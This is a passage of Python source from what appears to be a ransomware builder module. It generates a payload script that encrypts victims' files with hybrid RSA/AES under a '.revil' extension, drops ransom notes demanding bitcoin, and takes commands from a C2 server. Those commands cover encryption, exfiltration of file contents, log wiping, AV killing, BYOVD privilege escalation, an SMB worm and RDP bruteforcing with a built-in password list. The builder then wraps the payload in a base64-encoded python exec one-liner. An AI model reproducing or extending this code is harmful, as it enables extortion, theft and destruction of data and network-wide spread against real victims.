                f"    macOS Privesc : {'YES' if privilege_esc else 'NO'}"
            )
        else:
            header_lines.append("    (all disabled - not macOS target)")
        header_lines.append("  [Cross-Platform]")
        header_lines.append("    Encryption    : YES")
        header_lines.append(f"    Ransom GUI    : {'YES' if use_gui else 'NO'}")
        header_lines.append(f"    Anti-VM       : {'YES' if anti_vm else 'NO'}")
        header_lines.append(f"    Anti-Debug    : {'YES' if anti_debug else 'NO'}")
        header_lines.append(f"    Self-Delete   : {'YES' if self_delete else 'NO'}")
        header_lines.append(f"    Polymorphic   : {'YES' if polymorphic else 'NO'}")
        header_lines.append(
            f"    Post-Exploit  : {'YES' if post_exploit_enabled else 'NO'}"
        )
        header_lines.append("=" * 60)
        header_lines.append('"""')
        header_lines.append("")

        feature_header = "\n".join(header_lines) + "\n"

        # ═══ ASSEMBLE FINAL PAYLOAD ═══
        encryptor_script = feature_header + f'''
import os, sys, base64, hashlib, random, string, time, socket, threading
import subprocess, json, platform, ctypes, ctypes.wintypes, struct
import tempfile, shutil, sqlite3, re, uuid
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

# ===================================================================
# BUILD-TIME CONFIG
# ===================================================================
C2_HOST = "{lhost}"
C2_PORT = {lport}
ENCRYPTION = "{encryption}"
USE_HYBRID = {use_hybrid_bool}
EXTENSIONS = {ext_list_str}
BTC_ADDRESS = "{btc_address}"
WALLPAPER_CHANGE = {wallpaper_bool}
COUNTDOWN_SECONDS = {countdown_seconds}
EXFILTRATE_FILES = {exfiltrate_bool}
MAX_FILE_SIZE_MB = {max_file_size_mb}
USE_GUI = {use_gui_bool}
DECRYPT_KEY = "{decrypt_key}"
AV_BYPASS = {av_bypass_bool}
PRIVILEGE_ESCALATION = {privilege_esc_bool}
PARALLEL_ENCRYPTION = {parallel_bool}
THREAD_COUNT = {thread_count}
LATERAL_MOVEMENT_ENABLED = {lateral_movement}
LOLBINS_ENABLED = {lolbins}
SPREAD_METHODS = "{spread_methods}"
TARGET_SUBNETS = "{target_subnets}"
MAX_SPREAD_HOSTS = {max_spread_hosts}
USE_CREDENTIALS = {use_credentials_bool}
TARGET_OS_BUILD = "{target_os_lower}"

RANSOM_NOTE = """{ransom_note_escaped}"""
RSA_PUBLIC_KEY_PEM = """{pub_key_escaped}"""

# ===================================================================
# DESKTOP ICON CHANGER (embedded)
# ===================================================================

DESKTOP_ICON_CHANGE_ENABLED = {change_icons_bool}
RANSOM_ICON_URL = "{ransom_icon_url}"

{icons_embedded}


def get_os():
    s = platform.system().lower()
    if s == 'windows': return 'windows'
    elif s == 'darwin': return 'macos'
    return 'linux'


OS = get_os()
IS_WINDOWS = OS == 'windows'
IS_LINUX = OS == 'linux'
IS_MACOS = OS == 'macos'


def check_admin():
    try:
        if IS_WINDOWS:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


# ===================================================================
# WINDOWS-ONLY BLOCKS
# (BYOVD_ENABLED + SMB_SPREAD_ENABLED SELALU didefinisikan, non-Windows = False)
# ===================================================================
{av_block}

{av_killer_block}

{byovd_block}

{smb_block}

# ===================================================================
# ANTI-ANALYSIS (cross-platform)
# ===================================================================
{anti_block}

# ===================================================================
# RANSOM GUI (cross-platform, Tkinter)
# ===================================================================
{ransom_gui_block}

# ===================================================================
# POST-EXPLOITATION MODULE (embedded)
# ===================================================================
{post_exploit_block}

# ===================================================================
# POST-EXPLOITATION PHASE WRAPPER
# ===================================================================
{post_exploit_phase}


# ===================================================================
# INITIAL EXECUTION
# ===================================================================
print("[*] Payload starting...")
print("[*] Target OS (build-time): " + TARGET_OS_BUILD)
print("[*] Runtime OS: " + OS)
print("[*] Admin: " + str(check_admin()))

# Windows-only: AV bypass + killer
if IS_WINDOWS:
    if AV_BYPASS:
        try: _run_av_bypass()
        except Exception as _e: print("[!] AV bypass error: " + str(_e))
    try: _run_av_killer()
    except Exception as _e: print("[!] AV killer error: " + str(_e))
else:
    print("[*] Non-Windows OS - AV bypass / killer disabled")

# Anti-analysis (cross-platform)
if not _run_anti_analysis_gate():
    sys.exit(0)

if ANTI_TIMING_ENABLED:
    try: {names["timer_fn"]}()
    except Exception: pass

if ANTI_FORENSIC_ENABLED:
    try: {names["wipe_logs_fn"]}()
    except Exception: pass

if ANTI_RECOVERY_ENABLED:
    try: {names["anti_recovery_fn"]}()
    except Exception: pass

# Privilege escalation (per-OS)
if PRIVILEGE_ESCALATION:
    if IS_WINDOWS:
        if not check_admin():
            try:
                _uac_ok = _run_uac_bypass()
                if _uac_ok:
                    print("[+] Privilege: UAC bypass triggered")
                    time.sleep(2)
            except Exception as _e:
                print("[!] UAC bypass error: " + str(_e))
            if not check_admin() and BYOVD_ENABLED:
                try:
                    _ok = _run_byovd_escalation()
                    if _ok:
                        print("[+] Privilege: BYOVD SYSTEM obtained")
                except Exception as _e:
                    print("[!] BYOVD error: " + str(_e))
    elif IS_LINUX:
        try:
            _linux_privesc_attempt()
        except Exception as _e:
            print("[!] Linux privesc error: " + str(_e))
    elif IS_MACOS:
        try:
            _macos_privesc_attempt()
        except Exception as _e:
            print("[!] macOS privesc error: " + str(_e))

# Windows-only: SMB worm
if IS_WINDOWS and SMB_SPREAD_ENABLED:
    try:
        _start_smb_spread_thread()
        print("[*] SMB worm started in background")
    except Exception as _e:
        print("[!] SMB error: " + str(_e))


# ===================================================================
# ENCRYPTION FUNCTIONS (cross-platform)
# ===================================================================

def encrypt_file_hybrid(filepath, rsa_pub_pem):
    try:
        from Crypto.Cipher import AES, PKCS1_OAEP
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) == 0:
            return False
        aes_key = get_random_bytes(32)
        cipher = AES.new(aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        nonce = cipher.nonce
        if not rsa_pub_pem or "-----BEGIN" not in rsa_pub_pem:
            output = (0).to_bytes(2, "big") + aes_key + nonce + tag + ciphertext
        else:
            try:
                rsa_key = RSA.import_key(rsa_pub_pem)
                rsa_cipher = PKCS1_OAEP.new(rsa_key)
                encrypted_aes_key = rsa_cipher.encrypt(aes_key)
                key_len = len(encrypted_aes_key)
                output = key_len.to_bytes(2, "big") + encrypted_aes_key + nonce + tag + ciphertext
            except Exception:
                output = (0).to_bytes(2, "big") + aes_key + nonce + tag + ciphertext
        ep = filepath + ".revil"
        with open(ep, "wb") as f:
            f.write(output)
        if TRIPLE_PASS_ENABLED:
            _secure_delete(filepath)
        else:
            try: os.remove(filepath)
            except Exception: pass
        return True
    except Exception as e:
        print("[!] Hybrid encrypt error " + filepath + ": " + str(e))
        return False


def decrypt_file_hybrid(filepath, rsa_priv_pem):
    try:
        from Crypto.Cipher import AES, PKCS1_OAEP
        from Crypto.PublicKey import RSA
        if not filepath.endswith(".revil"):
            return False
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) < 2:
            return False
        key_len = int.from_bytes(data[:2], "big")
        offset = 2
        if key_len == 0:
            aes_key = data[offset:offset + 32]; offset += 32
        else:
            encrypted_aes_key = data[offset:offset + key_len]; offset += key_len
            rsa_key = RSA.import_key(rsa_priv_pem)
            rsa_cipher = PKCS1_OAEP.new(rsa_key)
            aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        nonce = data[offset:offset + 16]; offset += 16
        tag = data[offset:offset + 16]; offset += 16
        ciphertext = data[offset:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        output_path = filepath[:-6]
        with open(output_path, "wb") as f:
            f.write(plaintext)
        try: os.remove(filepath)
        except Exception: pass
        return True
    except Exception as e:
        print("[!] Hybrid decrypt error " + filepath + ": " + str(e))
        return False


def encrypt_file_legacy(filepath, key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        ep = filepath + ".revil"
        with open(ep, "wb") as f:
            f.write(enc)
        if TRIPLE_PASS_ENABLED: _secure_delete(filepath)
        else: os.remove(filepath)
        return True
    except Exception: return False


def decrypt_file_legacy(filepath, key):
    try:
        if not filepath.endswith(".revil"):
            return False
        with open(filepath, "rb") as f:
            data = f.read()
        dec = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        op = filepath[:-6]
        with open(op, "wb") as f:
            f.write(dec)
        os.remove(filepath)
        return True
    except Exception: return False


def encrypt_file(filepath, key_or_none=None):
    if USE_HYBRID:
        return encrypt_file_hybrid(filepath, RSA_PUBLIC_KEY_PEM)
    else:
        if key_or_none is None:
            key_or_none = hashlib.sha256(DECRYPT_KEY.encode()).digest()
        return encrypt_file_legacy(filepath, key_or_none)


def decrypt_file(filepath, key_or_priv):
    if USE_HYBRID:
        return decrypt_file_hybrid(filepath, key_or_priv)
    else:
        return decrypt_file_legacy(filepath, key_or_priv)


def find_files(encrypted_only=False):
    files = []
    exts = [e.lower().strip() for e in EXTENSIONS]
    dirs = []
    if IS_WINDOWS:
        import string as _str
        home = os.path.expanduser("~")
        dirs.extend([home, os.path.join(home, "Documents"),
                     os.path.join(home, "Downloads"), os.path.join(home, "Desktop"),
                     os.path.join(home, "Pictures")])
        for dl in _str.ascii_uppercase:
            dp = dl + ":\\\\"
            if os.path.exists(dp): dirs.append(dp)
    else:
        home = os.path.expanduser("~")
        dirs = [home, os.path.join(home, "Documents")]
        if os.path.exists("/home"):
            try:
                for ud in os.listdir("/home"):
                    up = os.path.join("/home", ud)
                    if os.path.isdir(up) and not ud.startswith("."):
                        dirs.append(up)
            except Exception: pass
        if os.path.exists("/root"): dirs.append("/root")
    dirs = list(set([d for d in dirs if d and os.path.exists(d) and os.path.isdir(d)]))
    skip = ["Windows", "System32", "Program Files", "__pycache__",
            "node_modules", ".git", "proc", "sys", "dev", "boot"]
    for rd in dirs:
        try:
            for dp, dn, fn in os.walk(rd):
                if any(s in dp for s in skip): continue
                if "/." in dp: continue
                for f in fn:
                    if f.startswith("README_RANSOM") or f.startswith("."): continue
                    fp = os.path.join(dp, f)
                    if encrypted_only:
                        if f.endswith(".revil"):
                            files.append(fp)
                    else:
                        if f.endswith(".revil"): continue
                        ext = f.split(".")[-1].lower() if "." in f else ""
                        if ext in exts:
                            try:
                                sz = os.path.getsize(fp)
                                if sz > 0:
                                    files.append(fp)
                            except Exception: pass
        except Exception: pass
    files.sort()
    return files


def parallel_encrypt_files(files, key_or_none=None):
    count = 0
    if not PARALLEL_ENCRYPTION or len(files) < 10:
        for f in files:
            if encrypt_file(f, key_or_none): count += 1
        return count
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as ex:
        futs = [ex.submit(encrypt_file, f, key_or_none) for f in files]
        for fut in as_completed(futs):
            try:
                if fut.result(): count += 1
            except Exception: pass
    return count


{wallpaper_block}

{ransom_note_block}

# ═══ RDP bruteforce wordlist ═══
def _bf_default_passwords():
    """Built-in password list."""
    return [
        "", "password", "Password", "PASSWORD", "123456", "12345678",
        "123456789", "12345", "1234", "qwerty", "abc123", "letmein",
        "welcome", "monkey", "dragon", "master", "sunshine", "princess",
        "Administrator", "admin", "Admin", "ADMIN", "root", "toor",
        "P@ssw0rd", "P@ssword", "Passw0rd", "Password1", "Password123",
        "Admin123", "Admin@123", "Welcome1", "Welcome123", "company",
        "Company", "Company123", "company123", "changeme", "ChangeMe",
        "ChangeMe123", "default", "Default", "111111", "000000",
        "121212", "654321", "666666", "888888", "1q2w3e", "1qaz2wsx",
        "qazwsx", "zaq12wsx", "qwe123", "Password!", "Password@",
        "Admin!", "Admin@", "P@ssw0rd!", "P@ssw0rd@", "Welcome!",
        "Welcome@", "asdfgh", "asdfghjkl", "zxcvbn", "qwertyuiop",
        "sysadmin", "sysadmin123", "backup", "Backup123", "oracle",
        "Oracle123", "cisco", "Cisco123", "guest", "Guest", "guest123",
        "test", "Test123", "demo", "Demo123", "temp", "Temp123",
    ]


def _bf_load_wordlist(path):
    """Load wordlist from file."""
    passwords = []
    try:
        if path and os.path.exists(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    pwd = line.rstrip("\\r\\n")
                    if pwd:
                        passwords.append(pwd)
                    if len(passwords) >= 10000:
                        break
            print(f"[+] Loaded {{len(passwords)}} passwords from {{path}}")  # ← FIX
    except Exception as e:
        print(f"[!] Wordlist error: {{e}}")  # ← FIX juga
    if not passwords:
        passwords = _bf_default_passwords()
    return passwords


_GLOBAL_C2_CLIENT = None


# ===================================================================
# C2Client v6.4
# ===================================================================
class C2Client:
    def __init__(self, host, port):
        global _GLOBAL_C2_CLIENT
        self.host = host
        self.port = port
        self.socket = None
        self.running = True
        self.handlers = {{
            'encrypt': self.cmd_encrypt,
            'decrypt': self.cmd_decrypt,
            'status': self.cmd_status,
            'kill': self.cmd_kill,
            'wallpaper': self.cmd_wallpaper,
            'note': self.cmd_note,
            'ping': self.cmd_ping,
            'wipe_logs': self.cmd_wipe_logs,
            'anti_recovery': self.cmd_anti_recovery,
            'byovd': self.cmd_byovd,
            'spread': self.cmd_spread,
            'av_kill': self.cmd_av_kill,
            'exfiltrate': self.cmd_exfiltrate,
            'show_gui': self.cmd_show_gui,
            'decrypt_gui': self.cmd_decrypt_gui,
            'rdp_enable': self.cmd_rdp_enable,        
            'rdp_bruteforce': self.cmd_rdp_bruteforce, 
        }}
        self.encrypted = False
        _GLOBAL_C2_CLIENT = self

    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.host, self.port))

            hostname = "unknown"
            for getter in [
                lambda: socket.gethostname(),
                lambda: platform.node(),
                lambda: os.environ.get('COMPUTERNAME', ''),
                lambda: os.environ.get('HOSTNAME', ''),
            ]:
                try:
                    v = getter()
                    if v and v.strip():
                        hostname = v.strip()
                        break
                except Exception:
                    continue

            user = "unknown"
            for getter in [
                lambda: os.environ.get('USERNAME', ''),
                lambda: os.environ.get('USER', ''),
                lambda: os.environ.get('LOGNAME', ''),
                lambda: __import__('getpass').getuser(),
            ]:
                try:
                    v = getter()
                    if v and v.strip() and v.strip() != 'unknown':
                        user = v.strip()
                        break
                except Exception:
                    continue

            try:
                is_admin_val = check_admin()
            except Exception as e:
                print(f"[!] check_admin error: {{e}}")
                is_admin_val = False

            if USE_HYBRID:
                key_info = {{
                    'victim_id': RANSOM_VICTIM_ID or 'N/A',
                    'key_fingerprint': RANSOM_KEY_FINGERPRINT or 'N/A',
                    'encryption': 'hybrid-rsa4096-aes256gcm',
                    'decrypt_key': '[HYBRID]'
                }}
            else:
                key_info = {{
                    'victim_id': 'N/A',
                    'key_fingerprint': 'N/A',
                    'encryption': ENCRYPTION,
                    'decrypt_key': DECRYPT_KEY
                }}

            # ═══ FIX v6.4: Safe access — non-Windows doesn't define BYOVD/SMB ═══
            _byovd_flag = bool(globals().get('BYOVD_ENABLED', False))
            _smb_flag = bool(globals().get('SMB_SPREAD_ENABLED', False))
            _av_flag = bool(globals().get('AV_BYPASS', False))

            info = {{
                'type': 'register',
                'os': OS or 'unknown',
                'hostname': hostname,
                'user': user,
                'is_admin': is_admin_val,
                'byovd': _byovd_flag,
                'smb_worm': _smb_flag,
                'av_bypass': _av_flag,
                'timestamp': datetime.now().isoformat()
            }}
            info.update(key_info)

            payload = json.dumps(info).encode() + b'\\n'
            sent = self.socket.send(payload)
            print(f"[+] Register sent: {{sent}} bytes")
            print(f"    Hostname: {{hostname}}")
            print(f"    User: {{user}}")
            print(f"    OS: {{OS}}")
            print(f"    Admin: {{is_admin_val}}")

            return True

        except socket.timeout as e:
            print(f"[!] Connect timeout: {{e}}")
            return False
        except ConnectionRefusedError as e:
            print(f"[!] Connection refused: {{e}}")
            return False
        except socket.gaierror as e:
            print(f"[!] DNS error: {{e}}")
            return False
        except Exception as e:
            print(f"[!] Connect error: {{type(e).__name__}}: {{e}}")
            import traceback
            traceback.print_exc()
            return False

    def listen(self):
        buf = ""
        print("[*] Listen loop started")

        while self.running:
            try:
                data = self.socket.recv(4096).decode("utf-8", errors="ignore")
                if not data:
                    print("[!] recv() returned empty — server closed")
                    break
                buf += data
                while '\\n' in buf:
                    line, buf = buf.split('\\n', 1)
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        cmd = json.loads(line)
                        t = cmd.get('type', '')

                        if t == 'ping':
                            self.send_resp({{'type': 'pong'}})
                            continue

                        if t in self.handlers:
                            threading.Thread(
                                target=self._safe_handle,
                                args=(self.handlers[t], cmd),
                                daemon=True
                            ).start()
                        else:
                            print(f"[?] Unknown cmd type: {{t}}")
                    except json.JSONDecodeError as e:
                        print(f"[!] JSON decode error: {{e}}")
                        continue
                    except Exception as e:
                        print(f"[!] Command handle error: {{e}}")
                        import traceback
                        traceback.print_exc()

            except socket.timeout:
                try:
                    self.send_resp({{'type': 'pong', 'status': 'alive'}})
                except Exception as e:
                    print(f"[!] Heartbeat send failed: {{e}}")
                    break
                continue
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
                print(f"[!] Connection error: {{type(e).__name__}}: {{e}}")
                break
            except OSError as e:
                print(f"[!] Socket error: {{e}}")
                break
            except Exception as e:
                print(f"[!] Listen fatal: {{type(e).__name__}}: {{e}}")
                import traceback
                traceback.print_exc()
                break

        self.running = False
        print("[*] Listen loop ended")

    def _safe_handle(self, handler, cmd):
        try:
            handler(cmd)
        except Exception as e:
            print(f"[!] Handler error: {{e}}")
            import traceback
            traceback.print_exc()

    def send_resp(self, resp):
        try:
            resp['timestamp'] = datetime.now().isoformat()
            if USE_HYBRID:
                resp['victim_id'] = RANSOM_VICTIM_ID
            self.socket.send(json.dumps(resp).encode() + b'\\n')
        except Exception as e:
            print(f"[!] send_resp error: {{e}}")

    def cmd_encrypt(self, cmd):
        if POST_EXPLOIT_ENABLED:
            try:
                _run_post_exploitation_phase()
            except Exception as e:
                print(f"[!] Post-exploit error: {{e}}")
        files = find_files(False)
        count = parallel_encrypt_files(files)
        self.encrypted = True
        drop_ransom_note()
        change_wallpaper()
        if DESKTOP_ICON_CHANGE_ENABLED:
            try:
                r = change_desktop_icons(icon_url=RANSOM_ICON_URL)
                if r.get("success"):
                    print("[+] Desktop icons replaced")
            except Exception as e:
                print(f"[!] Icons error: {{e}}")
        if ANTI_FORENSIC_ENABLED:
            try:
                wipe_logs_fn()
            except Exception:
                pass
        if USE_GUI:
            try:
                _handle_encryption_complete()
            except Exception as e:
                print(f"[!] GUI error: {{e}}")
        self.send_resp({{
            'type': 'encrypt_response',
            'status': 'success',
            'files_encrypted': count,
            'total': len(files),
            'encryption': 'hybrid' if USE_HYBRID else ENCRYPTION
        }})

    def cmd_decrypt(self, cmd):
        if USE_HYBRID:
            self.send_resp({{
                'type': 'decrypt_response',
                'status': 'denied',
                'message': 'Hybrid requires private key',
                'files_decrypted': 0
            }})
            return
        files = find_files(True)
        count = 0
        try:
            key = hashlib.sha256(DECRYPT_KEY.encode()).digest()
            for f in files:
                try:
                    if decrypt_file(f, key):
                        count += 1
                except Exception:
                    pass
        except Exception:
            pass
        self.encrypted = False
        if DESKTOP_ICON_CHANGE_ENABLED:
            try:
                restore_desktop_icons()
            except Exception:
                pass
        self.send_resp({{
            'type': 'decrypt_response',
            'status': 'success',
            'files_decrypted': count
        }})

    def cmd_status(self, cmd):
        files = find_files(True)
        self.send_resp({{
            'type': 'status_response',
            'status': 'ok',
            'os': OS,
            'is_admin': check_admin(),
            'encrypted': self.encrypted,
            'encrypted_files': len(files),
            'encryption_mode': 'hybrid' if USE_HYBRID else ENCRYPTION,
            'victim_id': RANSOM_VICTIM_ID if USE_HYBRID else 'N/A',
            'key_fingerprint': RANSOM_KEY_FINGERPRINT if USE_HYBRID else 'N/A'
        }})

    def cmd_wallpaper(self, cmd):
        change_wallpaper()
        self.send_resp({{'type': 'wallpaper_response', 'status': 'success'}})

    def cmd_note(self, cmd):
        drop_ransom_note()
        self.send_resp({{'type': 'note_response', 'status': 'success'}})

    def cmd_ping(self, cmd):
        self.send_resp({{'type': 'pong', 'status': 'ok'}})

    def cmd_wipe_logs(self, cmd):
        n = 0
        try:
            n = wipe_logs_fn()
        except Exception:
            pass
        self.send_resp({{
            'type': 'wipe_logs_response',
            'status': 'success',
            'items': n
        }})

    def cmd_anti_recovery(self, cmd):
        try:
            anti_recovery_fn()
        except Exception:
            pass
        self.send_resp({{'type': 'anti_recovery_response', 'status': 'success'}})

    def cmd_byovd(self, cmd):
        if not IS_WINDOWS:
            self.send_resp({{
                'type': 'byovd_response',
                'status': 'error',
                'message': 'BYOVD only on Windows'
            }})
            return
        try:
            ok = _run_byovd_escalation()
            self.send_resp({{
                'type': 'byovd_response',
                'status': 'success' if ok else 'failed',
                'is_admin': check_admin()
            }})
        except Exception as e:
            self.send_resp({{
                'type': 'byovd_response',
                'status': 'error',
                'message': str(e)
            }})

    def cmd_spread(self, cmd):
        if not IS_WINDOWS:
            self.send_resp({{
                'type': 'spread_response',
                'status': 'error',
                'message': 'SMB worm only on Windows'
            }})
            return
        try:
            n = _smb_spread()
            self.send_resp({{
                'type': 'spread_response',
                'status': 'success',
                'hosts': n
            }})
        except Exception as e:
            self.send_resp({{
                'type': 'spread_response',
                'status': 'error',
                'message': str(e)
            }})

    def cmd_av_kill(self, cmd):
        if not IS_WINDOWS:
            self.send_resp({{
                'type': 'av_kill_response',
                'status': 'error',
                'message': 'AV Killer only on Windows'
            }})
            return
        try:
            _run_av_killer()
            self.send_resp({{'type': 'av_kill_response', 'status': 'success'}})
        except Exception as e:
            self.send_resp({{
                'type': 'av_kill_response',
                'status': 'error',
                'message': str(e)
            }})

    def cmd_exfiltrate(self, cmd):
        try:
            files = find_files(False)
            cnt = 0
            for fp in files[:10]:
                try:
                    sz = os.path.getsize(fp) / (1024 * 1024)
                    if sz > MAX_FILE_SIZE_MB:
                        continue
                    with open(fp, "r", errors="ignore") as f:
                        content = f.read()
                    self.socket.send(json.dumps({{
                        'type': 'exfiltrate',
                        'filename': os.path.basename(fp),
                        'content': base64.b64encode(content.encode()).decode(),
                        'size': sz
                    }}).encode() + b'\\n')
                    cnt += 1
                except Exception:
                    pass
            self.send_resp({{
                'type': 'exfiltrate_response',
                'status': 'success',
                'files_exfiltrated': cnt
            }})
        except Exception as e:
            self.send_resp({{
                'type': 'exfiltrate_response',
                'status': 'error',
                'message': str(e)
            }})

    def cmd_show_gui(self, cmd):
        try:
            _handle_encryption_complete()
            self.send_resp({{'type': 'show_gui_response', 'status': 'success'}})
        except Exception as e:
            self.send_resp({{
                'type': 'show_gui_response',
                'status': 'error',
                'message': str(e)
            }})

    def cmd_decrypt_gui(self, cmd):
        try:
            threading.Thread(target=_launch_ransom_gui, daemon=True).start()
            self.send_resp({{'type': 'decrypt_gui_response', 'status': 'success'}})
        except Exception as e:
            self.send_resp({{
                'type': 'decrypt_gui_response',
                'status': 'error',
                'message': str(e)
            }})

        

    # ═══════════════════════════════════════════════════════════════
    # ═══ FIX v6.5: RDP Enable + Bruteforce handlers ═══
    # ═══════════════════════════════════════════════════════════════

    def cmd_rdp_enable(self, cmd):
        """Enable RDP/VNC on victim machine."""
        try:
            username = cmd.get('username', '') or ''
            password = cmd.get('password', '') or ''
            port = int(cmd.get('port', 3389))
            disable_nla = bool(cmd.get('disable_nla', False))

            print(f"[*] RDP Enable requested (port={{port}})...")

            enabler = RDPEnabler(
                username=username,
                password=password,
                port=port,
                disable_nla=disable_nla,
            )
            result = enabler.enable()

            self.send_resp({{
                'type': 'rdp_enable_response',
                'status': 'success' if result.get('success') else 'failed',
                'data': result,
            }})

            if result.get('success'):
                ci = result.get('connection_info', {{}})
                print(f"[+] RDP enabled: {{ci.get('host')}}:{{ci.get('port')}} "
                      f"({{ci.get('username')}}:{{ci.get('password')}})")
            else:
                print(f"[!] RDP enable failed: {{result.get('error', 'unknown')}}")

        except Exception as e:
            print(f"[!] cmd_rdp_enable error: {{e}}")
            import traceback
            traceback.print_exc()
            try:
                self.send_resp({{
                    'type': 'rdp_enable_response',
                    'status': 'error',
                    'message': str(e),
                }})
            except Exception:
                pass

    def cmd_rdp_bruteforce(self, cmd):
        """Bruteforce RDP target from victim machine."""
        try:
            target = cmd.get('target')
            if not target:
                self.send_resp({{
                    'type': 'rdp_bruteforce_response',
                    'status': 'error',
                    'message': 'target required',
                }})
                return

            port = int(cmd.get('port', 3389))
            domain = cmd.get('domain', '') or ''
            threads = int(cmd.get('threads', 4))
            timeout_val = float(cmd.get('timeout', 5.0))
            delay = float(cmd.get('delay', 1.0))
            max_fails = int(cmd.get('max_fails', 5))
            safe_mode = bool(cmd.get('safe_mode', True))
            stop_on_success = bool(cmd.get('stop_on_success', True))

            print(f"[*] RDP Bruteforce: {{target}}:{{port}}")

            self.send_resp({{
                'type': 'rdp_bruteforce_response',
                'status': 'started',
                'target': target,
            }})

            usernames = cmd.get('usernames') or []
            passwords = cmd.get('passwords') or []
            wordlist = cmd.get('wordlist') or ''

            if not usernames:
                usernames = ['administrator', 'admin', 'user', 'guest']

            if not passwords:
                if wordlist:
                    passwords = _bf_load_wordlist(wordlist)
                else:
                    passwords = _bf_default_passwords()

            print(f"[*] Testing {{len(usernames)}} users x {{len(passwords)}} passwords")

            bf = RDPBruteforcer(
                target=target,
                port=port,
                domain=domain,
                threads=threads,
                timeout=timeout_val,
                delay_min=max(0.1, delay * 0.5),
                delay_max=max(0.2, delay * 1.5),
                max_fails_per_user=max_fails,
                stop_on_success=stop_on_success,
                safe_mode=safe_mode,
            )

            hits = bf.run(usernames, passwords)

            self.send_resp({{
                'type': 'rdp_bruteforce_response',
                'status': 'success' if hits else 'no_hit',
                'result': {{
                    'target': target,
                    'attempts': bf.attempts,
                    'hits': hits,
                    'service_info': bf.service_info,
                }},
            }})

            if hits:
                for h in hits:
                    print(f"[★] HIT: {{h['username']}}:{{h['password']}}")
            else:
                print(f"[-] No hit for {{target}} ({{bf.attempts}} attempts)")

        except Exception as e:
            print(f"[!] cmd_rdp_bruteforce error: {{e}}")
            import traceback
            traceback.print_exc()
            try:
                self.send_resp({{
                    'type': 'rdp_bruteforce_response',
                    'status': 'error',
                    'message': str(e),
                }})
            except Exception:
                pass

    def cmd_kill(self, cmd):
        self.send_resp({{'type': 'kill_response', 'status': 'success'}})
        self.running = False
        try:
            self.socket.close()
        except Exception:
            pass
        if SELF_DELETE_ENABLED:
            try:
                self_delete_fn()
            except Exception:
                pass
        time.sleep(1)
        sys.exit(0)


def main():
    print("=" * 60)
    print("[*] Ransomware C2 Client (Hybrid + Post-Exploit)")
    print(f"[*] Target C2: {{C2_HOST}}:{{C2_PORT}}")
    print(f"[*] Build OS: {{TARGET_OS_BUILD}}")
    print(f"[*] Runtime OS: {{OS}}")
    print(f"[*] Admin: {{check_admin()}}")
    try:
        print(f"[*] Hostname: {{socket.gethostname()}}")
    except Exception:
        pass
    print("=" * 60)

    max_attempts = 5
    for attempt in range(1, max_attempts + 1):
        print(f"[*] Connect attempt {{attempt}}/{{max_attempts}}...")
        client = C2Client(C2_HOST, C2_PORT)
        if client.connect():
            print("[+] Connected to C2 — entering listen mode")
            try:
                client.listen()
            except Exception as e:
                print(f"[!] Listen error: {{e}}")
                import traceback
                traceback.print_exc()

            if not client.running:
                print("[!] Connection closed, will retry...")

        wait = min(30, 2 ** attempt)
        print(f"[*] Retry in {{wait}}s...")
        time.sleep(wait)

    print("[!] Max attempts reached — standalone mode")

    if SELF_DELETE_ENABLED:
        try:
            self_delete_fn()
        except Exception:
            pass


if __name__ == "__main__":
    main()
'''

        b64_payload = base64.b64encode(encryptor_script.encode()).decode()
        final_payload = "python3 -c \"import base64; exec(base64.b64decode('{0}').decode())\"".format(
            b64_payload
        )

        return {
            "python": final_payload,
            "base64": b64_payload,
            "script": encryptor_script,
            "decrypt_key": decrypt_key,
            "rsa_private_key_pem": rsa_private_key_pem,
            "rsa_public_key_pem": rsa_public_key_pem,
            "victim_id": victim_id,
            "key_fingerprint": key_fingerprint,
            "encryption_mode": "hybrid" if use_hybrid else "legacy",
            "target_os": target_os_lower,
        }


def run(session, options):
    lhost = options.get("LHOST", "127.0.0.1")
    lport = int(options.get("LPORT", 4444))
    encryption = options.get("ENCRYPTION", "hybrid")
    extensions = options.get(
        "EXTENSIONS",
        "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv",
    )
    ransom_note = options.get("RANSOM_NOTE", "YOUR FILES ARE ENCRYPTED!")
    btc = options.get("BTC_ADDRESS", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    wallpaper = str(options.get("WALLPAPER", True)).lower() == "true"
    countdown = int(options.get("COUNTDOWN_SECONDS", 300))
    use_gui = str(options.get("GUI_MODE", True)).lower() == "true"
    dkey = options.get("DECRYPT_KEY", "")
    av = str(options.get("AV_BYPASS", True)).lower() == "true"
    pe = str(options.get("PRIVILEGE_ESCALATION", True)).lower() == "true"
    change_icons = str(options.get("CHANGE_DESKTOP_ICONS", False)).lower() == "true"
    icon_url = options.get("RANSOM_ICON_URL", "")
    par = str(options.get("PARALLEL_ENCRYPTION", True)).lower() == "true"
    tc = int(options.get("THREAD_COUNT", 4))
    tos = options.get("TARGET_OS", "all")
    rsa_size = int(options.get("RSA_KEY_SIZE", 4096))

    a_vm = str(options.get("ANTI_VM", True)).lower() == "true"
    a_dbg = str(options.get("ANTI_DEBUG", True)).lower() == "true"
    a_fr = str(options.get("ANTI_FORENSIC", True)).lower() == "true"
    a_dmp = str(options.get("ANTI_DUMP", True)).lower() == "true"
    a_rec = str(options.get("ANTI_RECOVERY", True)).lower() == "true"
